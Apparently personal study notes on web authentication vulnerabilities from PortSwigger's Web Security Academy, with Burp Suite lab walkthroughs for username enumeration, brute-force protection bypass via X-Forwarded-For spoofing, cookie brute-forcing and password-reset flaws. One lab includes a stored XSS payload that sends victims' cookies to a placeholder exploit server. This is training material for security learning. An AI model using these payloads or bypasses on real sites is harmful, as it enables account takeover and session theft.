
2024-09-17 14:39

Source: #portswigger #web 

Authentication is the process of verifying the identity of a user or client. 
There are three main types of authentication:

   1. Something you `know` -
		   such as a password or the answer to a security question. These are sometimes called "knowledge factors".
   1. Something you `have` -
		   This is a physical object such as a mobile phone or security token. These are sometimes called "possession factors".
   1. Something you `are or do` - 
		   For example, your biometrics or patterns of behavior. These are sometimes called "inherence factors".
### What is the difference between authentication and authorization?

Authentication is the process of verifying that a user is who they claim to be. Authorization involves verifying whether a user is allowed to do something. 
### How do authentication vulnerabilities arise?

Most vulnerabilities in authentication mechanisms occur in one of two ways:

1. The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
2. Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes called "broken authentication".
### Brute-forcing 

#### Usernames

Usernames are especially easy to guess if they conform to a recognizable pattern, such as an email address. For example, it is very common to see business logins in the format `firstname.lastname@somecompany.com`. 
During auditing, check whether the website discloses potential usernames publicly. For example, are you able to access user profiles without logging in? Even if the actual content of the profiles is hidden, the name used in the profile is sometimes the same as the login username. You should also check HTTP responses to see if any email addresses are disclosed. Occasionally, responses contain email addresses of high-privileged users, such as administrators or IT support.
#### Password

However, while high-entropy passwords are difficult for computers alone to crack, we can use a basic knowledge of human behavior to exploit the vulnerabilities that users unwittingly introduce to this system. Rather than creating a strong password with a random combination of characters, users often take a password that they can remember and try to crowbar it into fitting the password policy.
### Username enumeration

While attempting to brute-force a login page, you should pay particular attention to any differences in:
###### Status Codes
It is best practice for websites to always return the same status code regardless of the outcome, but this practice is not always followed.
###### Error messages
Sometimes the returned error message is different depending on whether both the username AND password are incorrect or only the password was incorrect. It is best practice for websites to use identical, generic messages in both cases.
###### Response times
For example, a website might only check whether the password is correct if the username is valid. This extra step might cause a slight increase in the response time. 
This may be subtle, but an attacker can make this delay more obvious by entering an excessively long password that the website takes noticeably longer to handle.
#### *Lab* 

in [[burpsuite]] while setting the payload position in intruder 
Click on the Settings tab to open the Settings side panel. Under `Grep - Extract`, click Add. In the dialog that appears, scroll down through the response until you find the error message `Invalid username or password.` Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click `OK` and then start the attack. 

#### *Lab*: Username enumeration via response timing

while brute forcing Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts. 
Identify that the `X-Forwarded-For` header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.

- Send this request to Burp Intruder and select Pitchfork attack from the attack type drop-down menu. Add the `X-Forwarded-For` header.
- Add payload positions for the `X-Forwarded-For` header and the username parameter. Set the password to a very long string of characters (about 100 characters should do it).
- In the Payloads side panel, select position 1 from the Payload position drop-down list. Select the Numbers payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.
- Select position 2 from the Payload position drop-down list, then add the list of usernames. Start the attack.
- When the attack finishes, at the top of the dialog, click Columns and select the Response received and Response completed options. These two columns are now displayed in the results table. Notice that one of the response times was significantly longer than the others

Add the `X-Forwarded-For` header again and add a payload position to it. Insert the username that you just identified and add a payload position to the password parameter, find the response with a 302 status code
### Flawed brute-force protection

The two most common ways of preventing brute-force attacks are:

- Locking the account that the remote user is trying to access if they make too many failed login attempts
- Blocking the remote user's IP address if they make too many login attempts in quick succession

These aren't fail proof. For example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.
#### *Lab*: Broken brute-force protection, IP block

we find the same condition as mentioned in the example above 
to bypass that we use custom lists -
- username - 2 Carlos , 1 wiener ... and repeat
- password - 2 passwords from the given list , 1 peter ... and repeat 
this ensures that we perform a successful login to reset the counter after every 2 unsuccessful attempts
further go to resource pool and change the max concurrent requests to 1, making sure that 1 request is made at a time and also making sure that the sequence is followed 
hit attack and get the answer 
### Account Locking

One way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set number of failed login attempts. Just as with normal login errors, responses from the server indicating that an account is locked can also help an attacker to enumerate usernames.

Account locking also fails to protect against credential stuffing attacks. This involves using a massive dictionary of `username:password` pairs, composed of genuine login credentials stolen in data breaches. 

Credential stuffing relies on the fact that many people reuse the same username and password on multiple websites and, therefore, there is a chance that some of the compromised credentials in the dictionary are also valid on the target website. .
#### *Lab*: Username enumeration via account lock

Select Cluster bomb attack from the attack type drop-down menu. Add a payload position to the username parameter. Add a blank payload position to the end of the request body by clicking Add `§`.

```
username=§invalid-username§&password=example§§
```

In the Payloads side panel, add the list of usernames for the first payload position. For the second payload position, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack. Notice that one of the responses will have a different error message. 
### User rate limiting 

In this case, making too many login requests within a short period of time causes your IP address to be blocked. Typically, the IP can only be unblocked in one of the following ways:

- Automatically after a certain period of time has elapsed
- Manually by an administrator
- Manually by the user after successfully completing a CAPTCHA

User rate limiting is sometimes preferred to account locking due to being less prone to username enumeration and denial of service attacks. 

As the limit is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also possible to bypass this defense if you can work out how to guess multiple passwords with a single request.
### HTTP basic authentication

The client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64. This token is stored and managed by the browser, which automatically adds it to the Authorization header of every subsequent request as follows:

```
Authorization: Basic base64(username:password)
```

HTTP basic authentication is also particularly vulnerable to session-related exploits, notably CSRF, against which it offers no protection on its own.

In some cases, exploiting vulnerable HTTP basic authentication might only grant an attacker access to a seemingly uninteresting page. However, in addition to providing a further attack surface, the credentials exposed in this way might be reused in other, more confidential contexts.
### Multi Factor Authentication 

It is also worth noting that the full benefits of multi-factor authentication are only achieved by verifying multiple different factors. Verifying the same factor in two different ways is not true two-factor authentication. Email-based 2FA is one such example. Although the user has to provide a password and a verification code, accessing the code only relies on them knowing the login credentials for their email account. Therefore, **the knowledge authentication factor is simply being verified twice.**

 some websites send verification codes to a user's mobile phone as a text message. While this is technically still verifying the factor of "something you have", it is open to abuse. Firstly, the code is being transmitted via SMS rather than being generated by the device itself (high-security websites now provide users with a dedicated device for this purpose). This creates the potential for the code to be intercepted. There is also a risk of SIM swapping, whereby an attacker fraudulently obtains a SIM card with the victim's phone number. 

#### Bypass 2FA

If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.
#### Flawed 2FA 

1. Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.
2. They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:
3. When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:
4. In this case, an attacker could log in using their own credentials but then change the value of the account cookie to any arbitrary username when submitting the verification code.
### Other Authentication methods 

#### Keeping users logged in 

This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. 
As possessing this cookie effectively allows you to bypass the entire login process 

- some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. Some even use the password as part of the cookie. 
- This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially deduce how it is generated. 
> - If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. This method can be used to bypass login attempt limits if a similar limit isn't applied to cookie guesses.

Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as XSS, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that.
> If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.
##### *Lab* - Brute-forcing a stay-logged-in cookie

- clicking on the stay logged in button while logging in sets a `set-logged-in` cookie
- examine the cookie - its b64 encoded, then the password is MD5 hashed. (educated guess)
	so the cookie is constructed as follows - `base64(username+':'+md5HashOfPassword)`

In the most recent `GET /my-account?id=wiener` request highlight the stay-logged-in cookie parameter and send the request to Burp Intruder. 
> Remove `?id=wiener` and remove the session cookie as if the `stay-logged-in` is valid then it generates a new session for us.

Under Payload processing, add the following rules in order. 
- Hash: MD5
- Add prefix: wiener:
- Encode: Base64-encode

As the Update email button is only displayed when you access the My account page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the  Settings side panel, add a `grep match` rule to flag any responses containing the string `Update email`
##### *Lab - offline passwrd cracking*

-we have a `stay-logged-in` cookie crafted the same as the above lab
- here we have a comment functionality and an exploit server , observe that the comment functionality is vulnerable to XSS.
Go to one of the blogs and post a comment containing the following stored XSS payload,
```js
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.
-  since the cookie is crafted the same as before, decode it accordingly.
  
### Passwrd reset 

1. Sending passwords by email - approach is highly susceptible to man-in-the-middle attacks.
2. Resetting passwords using a URL - 
	- Send a unique URL to users that takes them to a password reset page , generate a high entropy, hard to guess token in URL. In the best case scenario, this URL should provide no hints about which user's password is being reset. 
	- When the user visits this URL, the system should check whether this token exists on the back-end and, if so, which user's password it is supposed to reset. This token should expire after a short period of time and be destroyed immediately after the password has been reset. However, some websites fail to also validate the token again when the reset form is submitted.
#### *Lab*: Password reset broken logic 

Click forgot password go to the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want. Notice that when you submit your new password, the `POST /forgot-password?temp-forgot-password-token` request contains the username as hidden input. 

In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the `temp-forgot-password-token` parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.

 Change the username parameter to carlos. log in to Carlos's account using the new password you just set.

> If the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning. 
#### *Lab: Password reset poisoning via middleware*

Explore the password reset functionality fully by changing the password of a known account




### References 

https://portswigger.net/web-security/authentication